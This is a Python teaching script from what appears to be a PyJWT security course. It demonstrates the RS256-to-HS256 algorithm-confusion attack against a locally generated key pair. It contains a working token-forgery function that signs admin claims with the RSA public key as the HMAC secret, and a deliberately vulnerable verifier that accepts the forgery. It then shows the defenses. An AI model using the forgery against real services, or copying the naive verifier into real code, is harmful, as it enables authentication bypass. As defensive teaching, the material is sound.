"""
03 · Algorithm-confusion attack — the classic RS256 -> HS256 forgery
=====================================================================

This is the most famous JWT attack. Setup:

* A server issues **RS256** tokens (asymmetric: private key signs, PUBLIC key
  verifies). The public key is, by design, known to everyone.
* The server's verification is misconfigured to allow BOTH algorithms:
  ``algorithms=["HS256", "RS256"]`` and it passes the **RSA public key** as the
  verification key.

The exploit: HS256 is *symmetric* — the same key signs and verifies. So the
attacker takes the well-known **public key** and uses it as the **HMAC secret**
to forge an HS256 token. The misconfigured server then "verifies" that token
using the public key as the HMAC secret... and it matches. Forgery complete —
no private key required.

What this script demonstrates, all actually running:

1. **Forgery SUCCEEDS** against a naive verifier that treats the public key as
   an HMAC secret (this models historically-vulnerable libraries / hand-rolled
   verification).
2. **PyJWT's built-in guard** blocks the same bad config: modern PyJWT refuses
   to use an asymmetric PEM as an HMAC secret (``InvalidKeyError``).
3. **The real fix you control:** pin ``algorithms=["RS256"]`` only — the forged
   HS256 token is rejected outright.

Run:
    /home/astro/catalyst/jwt-test/.venv/bin/python \
        pyjwt-course/14-security-best-practices/03_algorithm_confusion_rsa_hmac.py
"""

import base64
import hashlib
import hmac

import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


def b64url_nopad(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def forge_hs256_with_public_key(payload_json: bytes, public_pem: str) -> str:
    """Attacker: build an HS256 token using the RSA *public key* as the secret."""
    header = b64url_nopad(b'{"alg":"HS256","typ":"JWT"}')
    payload = b64url_nopad(payload_json)
    signing_input = f"{header}.{payload}".encode("ascii")
    # The public key PEM bytes ARE the HMAC secret here — that's the attack.
    sig = hmac.new(public_pem.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url_nopad(sig)}"


def vulnerable_verify(token: str, public_pem: str) -> dict:
    """A naive/legacy verifier that allows HS256 with the public key as secret.

    This reproduces the verification logic of historically-vulnerable JWT
    libraries (pre-mitigation) that did not refuse asymmetric keys for HMAC.
    """
    header_seg, payload_seg, sig_seg = token.split(".")
    signing_input = f"{header_seg}.{payload_seg}".encode("ascii")
    expected = hmac.new(
        public_pem.encode("utf-8"), signing_input, hashlib.sha256
    ).digest()
    presented = base64.urlsafe_b64decode(sig_seg + "=" * (-len(sig_seg) % 4))
    if not hmac.compare_digest(expected, presented):
        raise ValueError("signature mismatch")
    payload_json = base64.urlsafe_b64decode(payload_seg + "=" * (-len(payload_seg) % 4))
    import json

    return json.loads(payload_json)


def main() -> None:
    # --- The legitimate server's RSA key pair ---
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()
    public_pem = (
        private_key.public_key()
        .public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        .decode()
    )

    print("=" * 72)
    print("SETUP — server issues RS256 tokens; public key is known to everyone")
    print("=" * 72)
    legit = jwt.encode({"sub": "alice", "role": "user"}, private_pem, algorithm="RS256")
    print(f"legit RS256 token: {legit[:50]}...")
    print("public key (shared with the world):")
    print("  " + public_pem.splitlines()[0] + " ... " + public_pem.splitlines()[-1])
    print()

    print("=" * 72)
    print("ATTACK — forge an HS256 token using the PUBLIC KEY as the HMAC secret")
    print("=" * 72)
    forged = forge_hs256_with_public_key(b'{"sub":"attacker","role":"admin"}', public_pem)
    print(f"forged HS256 token: {forged[:50]}...")
    print('forged payload claims: {"sub":"attacker","role":"admin"}\n')

    print("=" * 72)
    print("RESULT 1 — Vulnerable verifier (allows HS256 w/ public key) -> FORGED IN")
    print("=" * 72)
    try:
        claims = vulnerable_verify(forged, public_pem)
        print(f"VULNERABLE SERVER ACCEPTED THE FORGERY: {claims}")
        print(">>> Attacker is now 'admin' without ever touching the private key. <<<\n")
    except Exception as exc:  # noqa: BLE001
        print(f"unexpected: vulnerable verifier rejected: {exc}\n")

    print("=" * 72)
    print("RESULT 2 — Modern PyJWT GUARD blocks the same bad config")
    print("=" * 72)
    try:
        # The "foolish" server config: allow HS256+RS256, key = public PEM.
        jwt.decode(forged, public_pem, algorithms=["HS256", "RS256"])
        print("UNEXPECTED: PyJWT accepted the forgery!")
    except jwt.InvalidKeyError as exc:
        print(f"PyJWT refused: {type(exc).__name__}: {exc}")
        print("PyJWT proactively forbids asymmetric PEMs as HMAC secrets.\n")
    except jwt.InvalidTokenError as exc:
        print(f"PyJWT refused: {type(exc).__name__}: {exc}\n")

    print("=" * 72)
    print("RESULT 3 — The fix YOU control: pin algorithms=['RS256'] only")
    print("=" * 72)
    try:
        jwt.decode(forged, public_pem, algorithms=["RS256"])
        print("UNEXPECTED: forged HS256 token verified under RS256 pin!")
    except jwt.InvalidTokenError as exc:
        print(f"forged token rejected: {type(exc).__name__}: {exc}")
    # And the genuine RS256 token still verifies under the strict pin.
    good = jwt.decode(legit, public_pem, algorithms=["RS256"])
    print(f"genuine RS256 token still verifies: {good}\n")

    print("=" * 72)
    print("DEFENSE SUMMARY")
    print("=" * 72)
    print("1. Pin EXACTLY the asymmetric algorithm you issue: algorithms=['RS256'].")
    print("2. Never include a symmetric alg (HS*) alongside an asymmetric one.")
    print("3. Modern PyJWT also refuses asymmetric keys as HMAC secrets — but do")
    print("   not rely on that alone; pin your algorithms explicitly.")


if __name__ == "__main__":
    main()
